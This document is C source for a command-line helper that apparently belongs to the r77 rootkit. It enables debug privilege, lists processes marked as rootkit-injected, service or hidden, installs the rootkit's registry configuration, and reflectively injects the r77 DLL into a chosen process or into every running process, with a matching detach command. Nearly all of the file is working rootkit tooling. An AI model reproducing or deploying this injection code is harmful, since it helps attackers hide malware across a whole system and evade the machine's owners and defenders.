#include "Helper.h"
#include "r77def.h"
#include "r77win.h"
#include "r77config.h"
#include "r77process.h"
#include <stdio.h>
#include <Shlwapi.h>
#include <tlhelp32.h>
#include <Psapi.h>

int CALLBACK WinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE previousInstance, _In_ LPSTR commandLine, _In_ int cmdShow)
{
	EnabledDebugPrivilege();

	int argCount;
	LPWSTR *args = CommandLineToArgvW(GetCommandLineW(), &argCount);
	if (!args) return 1;

	if (argCount == 1)
	{
		MessageBoxW(NULL, L"This is a commandline utility used by TestConsole.exe", COALESCE_BITNESS(L"Helper32.exe", L"Helper64.exe"), MB_ICONASTERISK | MB_OK);
		return 1;
	}
	// Helper32|64.exe -config
	else if (argCount == 2 && !StrCmpIW(args[1], L"-config"))
	{
		return CreateConfig();
	}
	// Helper32|64.exe -list
	else if (argCount == 2 && !StrCmpIW(args[1], L"-list"))
	{
		return ProcessList();
	}
	// All processes: Helper32|64.exe -inject -all "C:\path\to\r77-*.dll"
	// Specific PID:  Helper32|64.exe -inject 1234 "C:\path\to\r77-*.dll"
	else if (argCount == 4 && !StrCmpIW(args[1], L"-inject"))
	{
		if (!StrCmpIW(args[2], L"-all"))
		{
			return Inject(-1, args[3]);
		}
		else
		{
			DWORD processId = _wtol(args[2]);
			return processId == 0 ? 1 : Inject(processId, args[3]);
		}
	}
	// All processes: Helper32|64.exe -detach -all
	// Specific PID:  Helper32|64.exe -detach 1234
	else if (argCount == 3 && !StrCmpIW(args[1], L"-detach"))
	{
		if (!StrCmpIW(args[2], L"-all"))
		{
			return Detach(-1);
		}
		else
		{
			DWORD processId = _wtol(args[2]);
			return processId == 0 ? 1 : Detach(processId);
		}
	}
	else
	{
		return 1;
	}
}

int ProcessList()
{
	// Get r77 configuration to determine which processes are hidden by ID.
	PR77_CONFIG r77Config = LoadR77Config();

	// Get all processes with an r77 signature. The signature indicates either,
	//  - that a process is injected with the rootkit,
	//  - or that it's the r77 service,
	//  - or that it's an r77 helper file.

	PR77_PROCESS r77Processes = NEW_ARRAY(R77_PROCESS, 1000);
	DWORD r77ProcessCount = 1000;
	if (!GetR77Processes(r77Processes, &r77ProcessCount)) r77ProcessCount = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) return 1;

	PROCESSENTRY32W processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	WCHAR fileName[MAX_PATH + 1];
	WCHAR userName[256];

	for (BOOL enumerate = Process32FirstW(snapshot, &processEntry); enumerate; enumerate = Process32NextW(snapshot, &processEntry))
	{
		// Query following information for each process, using OpenProcess with the least possible DesiredAccess.
		fileName[0] = L'\0';
		DWORD platform = -1;
		DWORD integrityLevel = -1;
		userName[0] = L'\0';
		DWORD userNameLength = 256;
		DWORD isInjected = 0;
		DWORD isR77Service = 0;
		DWORD isHelper = 0;
		DWORD isHiddenById = 0;

		GetProcessFileName(processEntry.th32ProcessID, TRUE, fileName, MAX_PATH);

		BOOL is64Bit;
		if (Is64BitProcess(processEntry.th32ProcessID, &is64Bit))
		{
			platform = is64Bit ? 64 : 32;
		}

		HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
		if (process)
		{
			GetProcessIntegrityLevel(process, &integrityLevel);

			if (!GetProcessUserName(process, userName, &userNameLength)) userName[0] = L'\0';

			CloseHandle(process);
		}

		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].ProcessId == processEntry.th32ProcessID)
			{
				// If the process is in the list of r77 processes, its signature will tell what kind of r77 process it is.

				if (r77Processes[i].Signature == R77_SIGNATURE) isInjected = 1;
				else if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE) isR77Service = 1;
				else if (r77Processes[i].Signature == R77_HELPER_SIGNATURE) isHelper = 1;

				break;
			}
		}

		isHiddenById = IntegerListContains(r77Config->HiddenProcessIds, processEntry.th32ProcessID);

		wprintf
		(
			L"%ld|%s|%s|%ld|%ld|%s|%ld|%ld|%ld|%ld\n",
			processEntry.th32ProcessID,
			processEntry.szExeFile,
			fileName,
			platform,
			integrityLevel,
			userName,
			isInjected,
			isR77Service,
			isHelper,
			isHiddenById
		);
	}

	CloseHandle(snapshot);

	return 0;
}
int CreateConfig()
{
	HKEY key;
	if (InstallR77Config(&key))
	{
		RegCloseKey(key);
		return 0;
	}
	else
	{
		return 1;
	}
}
int Inject(DWORD processId, LPCWSTR dllPath)
{
	// Read r77-x86.dll or r77-x64.dll into memory for reflective DLL injection.
	// When r77 is deployed, the DLL does not need to be on the disk; It is injected directly from memory into the remote process.

	LPBYTE dll;
	DWORD dllSize;
	if (!ReadFileContent(dllPath, &dll, &dllSize)) return 1;

	if (processId == -1)
	{
		// Inject all processes
		LPDWORD processes = NEW_ARRAY(DWORD, 10000);
		DWORD processCount = 0;
		if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
		{
			processCount /= sizeof(DWORD);

			for (DWORD i = 0; i < processCount; i++)
			{
				InjectDll(processes[i], dll, dllSize, TRUE);
			}

			return 0;
		}
		else
		{
			return 1;
		}
	}
	else
	{
		// Inject specific process
		return InjectDll(processId, dll, dllSize, FALSE) ? 0 : 1;
	}
}
int Detach(DWORD processId)
{
	if (processId == -1)
	{
		// Detach from all processes
		DetachAllInjectedProcesses();
		return 0;
	}
	else
	{
		// Detach from specific process
		return DetachInjectedProcessById(processId) ? 0 : 1;
	}
}